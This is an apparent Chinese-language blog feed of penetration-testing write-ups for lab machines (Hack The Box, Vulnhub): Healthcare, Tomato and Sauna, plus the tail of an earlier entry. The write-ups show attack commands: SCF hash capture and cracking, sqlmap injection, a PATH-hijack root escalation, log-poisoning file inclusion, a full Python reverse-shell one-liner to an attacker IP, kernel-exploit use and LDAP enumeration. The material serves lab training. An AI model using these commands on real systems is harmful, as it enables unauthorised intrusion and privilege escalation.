<p>我尝试了很久的文件上产webshell都没有成功，切换思路，既然目标主机开放了445端口和共享SMB服务，那么我们可以利用SCF文件攻击(虽然这种攻击方式很不常见)。我们首先先手动创建一个scf文件<br><img src="https://img-blog.csdnimg.cn/5d503addbbcf4fd683f0a1c02274294e.png" alt="在这里插入图片描述"><br>然后启动responder程序进行监听<br><img src="https://img-blog.csdnimg.cn/c906af81139e4e569a4ca96169bb3d3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们上传我们写的shell.scf文件，上传成功后会出现一个tony用户的哈希值，加密的方式是<code>NTLMv2</code><br><img src="https://img-blog.csdnimg.cn/4b75787e99934dc8986ba6a5d124e686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用hashcat对这个哈希值进行破解，破解得到的密码是<code>liltony</code><br><img src="https://img-blog.csdnimg.cn/b4ae03ebc9e441cb81c41063bde7d8f7.png" alt="在这里插入图片描述"><br>我们使用这个账号密码进行登录，得到了普通用户的权限<br><img src="https://img-blog.csdnimg.cn/ac151987bd374eeb9178da89785bfe70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看到存在<code>spoolsv</code>这个进程，这是一个<code>Windows Print Spooler</code>服务，存在一个CVE漏洞编号，对应的CVE编号是<code>CVE-2021-1675</code><br><img src="https://img-blog.csdnimg.cn/235805f980cf43c68a8fc68310f5bcf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在目标主机上远程加载我们的powershell脚本，并且使用脚本创建一个匿属管理员组的用户<br><img src="https://img-blog.csdnimg.cn/1b8333a9b0734baabe95425606940b95.png" alt="在这里插入图片描述"><br>添加成功后，我们可以使用这个账户密码进行登录了，权限是管理员权限<br><img src="https://img-blog.csdnimg.cn/a778b21f88954011b0a534250f909205.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Windows Print Spooler</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Healthcare</title>
    <url>/2021/12/26/Healthcare/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标主机开放了ftp和web服务，并且扫描出了不允许访问的几个目录<br><img src="https://img-blog.csdnimg.cn/5dbfa03fea4c49f1a2b08c27a605fbcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们分别访问这几个目录，发现只有一个目录可以正常访问，其他目录都显示404状态码<br><img src="https://img-blog.csdnimg.cn/856663a863cd441ca9ca6d8e62e83129.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d0a8cae2057141059254c7688269f92c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们没发现任何有价值的信息，那么就fuzz一下路径吧，发现存在一个openemr路径，进入后发现是后台登录页面</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u &quot;http:&#x2F;&#x2F;192.168.101.200&quot; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-big.txt -e 404,403,500</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/62eb523aa913490cb9772221e6da1687.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ffb2f3248388447cbbbb28ff1fe1f4fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到post表单，条件反射验证是够存在SQL注入漏洞，使用burpsuite抓包并使用sqlmap进行注入<br><img src="https://img-blog.csdnimg.cn/9fc387f225fb434d9189cf499ec9fd96.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对数据库进行注入<br><img src="https://img-blog.csdnimg.cn/b71794267f1340b2bd79b21e04a19913.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看存在users表<br><img src="https://img-blog.csdnimg.cn/786a517b4ae94a70998658329530e0ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>发现users表里存在username和password两个字段<br><img src="https://img-blog.csdnimg.cn/3ad57acd36ea44a6965f90f1200a4b83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>注入发现了两个用户名和密码，我们分别尝试登录ftp，发现使用medical账号可以登录成功<br><img src="https://img-blog.csdnimg.cn/5f4e0f07bb7540f4b112b1c1d3b46062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d996972aacfe4e6f8988bca089b13a40.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将payload上传到<code>/var/www/html/openemr</code>目录中，并进行访问<br><img src="https://img-blog.csdnimg.cn/8b9e1beafa41414a8d24428ffd10e758.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们切换到medical用户上，并查找可以执行的二进制文件<code>find / -perm -4000 2&gt;/dev/null</code><br><img src="https://img-blog.csdnimg.cn/38be5967b2204505b7abd5d0fbb30704.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现<code>/usr/bin/healthcheck</code>文件是比较容易受到攻击的程序，它只是运行了一堆标准的linux程序，比较明显的是<code>fdisk -l</code>这个程序<br><img src="https://img-blog.csdnimg.cn/53728f3d36a841d1a02a990f9a6c58c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们输入以下常见的提权操作，先将/bin/bash命令写入到fdisk程序中，并将其导入到medical用户的执行路径中，添加执行权限并拿取root权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; fdisk</span><br><span class="line">chmod +x fdisk</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;medical:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;healthcheck</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/cda20fb3c5914ceaa4d13a6d3a7adf62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SQL注入漏洞</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomato</title>
    <url>/2021/12/24/Tomato/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>运行我们的bash脚本，发现目标系统开放了ftp和web服务<br><img src="https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试是否可以匿名登录ftp，未果<br><img src="https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们访问web服务，发现是一个番茄图片，查看源码也没什么发现</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们fuzz一下路径，发现了存在一个antibot_image路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.101.197/&quot;</span> -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们发现存在一个info.php文件<br><img src="https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件的源码提示我们存在文件包含漏洞<br><img src="https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们验证漏洞确实是真实存在的<br><img src="https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们尝试将一句话写进日志文件中，日志文件的路径为<code>/var/log/auth.log</code>，发现已被写入日志并成功执行我们的命令<br><img src="https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就可以查找python是否存在，若存在则可以反弹shell到我们本地的机子上。可以看到python是存在的，并且版本为3.5<br><img src="https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将执行如下的payload添加到cmd参数后获得一个shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.101.196&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们将linpeas.sh脚本上传到靶机上，并执行它<br><img src="https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现存在一个linux内核漏洞<br><img src="https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们发现这个内核漏洞对应的漏洞编号为<code>CVE-2017-6074</code>，我们将其编译变上传到靶机上，执行即root<br><img src="https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>文件包含漏洞</category>
      </categories>
      <tags>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna</title>
    <url>/2021/12/24/Sauna/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/0c4f7155f0a144fca320112bb07de39c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现开放了445，80，88，5985这些常见的可能存在漏洞的端口。因为存在ldap服务，可能考虑到存在内网<br><img src="https://img-blog.csdnimg.cn/18c6ed7749514992adad88f2a6fa97f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>发现了smb服务，尝试是否可以登录<br><img src="https://img-blog.csdnimg.cn/cae8f24d7edf4d9ab4db6a15e3d5c60b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>登录失败，那我们查看一下ldap有没有什么有价值的信息<br><img src="https://img-blog.csdnimg.cn/f0249267ceca4d73943001c895249779.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.10.175 -b <span class="string">&quot;dc=EGOTISTICAL-BANK,dc=local&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=EGOTISTICAL-BANK,dc=local&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line">objectClass: domainDNS</span><br><span class="line">distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">instanceType: 5</span><br><span class="line">whenCreated: 20200123054425.0Z</span><br><span class="line">whenChanged: 20211018114224.0Z</span><br><span class="line">subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">uSNCreated: 4099</span><br><span class="line">dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==</span><br><span class="line">uSNChanged: 98336</span><br><span class="line">name: EGOTISTICAL-BANK</span><br><span class="line">objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==</span><br><span class="line">replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ/uf</span><br><span class="line"> RcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA</span><br><span class="line"> AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4</span><br><span class="line"> TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==</span><br><span class="line">creationTime: 132790309446175365</span><br><span class="line">forceLogoff: -9223372036854775808</span><br><span class="line">lockoutDuration: -18000000000</span><br><span class="line">lockOutObservationWindow: -18000000000</span><br><span class="line">lockoutThreshold: 0</span><br><span class="line">maxPwdAge: -36288000000000</span><br><span class="line">minPwdAge: -864000000000</span><br><span class="line">minPwdLength: 7</span><br><span class="line">modifiedCountAtLastProm: 0</span><br><span class="line">nextRid: 1000</span><br><span class="line">pwdProperties: 1</span><br><span class="line">pwdHistoryLength: 24</span><br><span class="line">objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG</span><br><span class="line">serverState: 1</span><br><span class="line">uASCompat: 1</span><br><span class="line">modifiedCount: 1</span><br><span class="line">auditingPolicy:: AAE=</span><br><span class="line">nTMixedDomain: 0</span><br><span class="line">rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name</span><br><span class="line"> ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">systemFlags: -1946157056</span><br><span class="line">wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT</span><br><span class="line"> ISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra</span><br><span class="line"> m Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin</span><br><span class="line"> cipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=</span><br><span class="line"> EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E</span><br><span class="line"> GOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO</span><br><span class="line"> TISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC</span><br><span class="line"> AL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,</span><br><span class="line"> DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA</span><br><span class="line"> L-BANK,DC=LOCAL</span><br><span class="line">objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D</span><br><span class="line"> C=LOCAL</span><br><span class="line">isCriticalSystemObject: TRUE</span><br><span class="line">gPLink: [LDAP://CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=Syste</span><br><span class="line"> m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]</span><br><span class="line">dSCorePropagationData: 16010101000000.0Z</span><br><span class="line">otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS</span><br><span class="line"> TICAL-BANK,DC=LOCAL</span><br><span class="line">otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic</span><br><span class="line"> e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN</span><br><span class="line"> =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">ms-DS-MachineAccountQuota: 10</span><br><span class="line">msDS-Behavior-Version: 7</span><br><span class="line">msDS-PerUserTrustQuota: 1</span><br><span class="line">msDS-AllUsersTrustQuota: 1000</span><br><span class="line">msDS-PerUserTrustTombstonesQuota: 10</span><br><span class="line">msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na</span><br><span class="line"> me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N</span><br><span class="line"> ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line">msDS-NcType: 0</span><br><span class="line">msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE</span><br><span class="line">dc: EGOTISTICAL-BANK</span><br><span class="line"><span class="comment"># Users, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Computers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Domain Controllers, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># System, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># LostAndFound, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Infrastructure, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Program Data, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># NTDS Quotas, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Managed Service Accounts, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Keys, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># TPM Devices, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Builtin, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># Hugo Smith, EGOTISTICAL-BANK.LOCAL</span></span><br><span class="line">dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST</span><br><span class="line"> ICAL-BANK,DC=LOCAL</span><br><span class="line"><span class="comment"># search reference</span></span><br><span class="line">ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC</span><br><span class="line"> AL</span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"><span class="comment"># numResponses: 19</span></span><br><span class="line"><span class="comment"># numEntries: 15</span></span><br><span class="line"><span class="comment"># numReferences: 3</span></span><br></pre></td></tr></table></figure>
<!--more-->

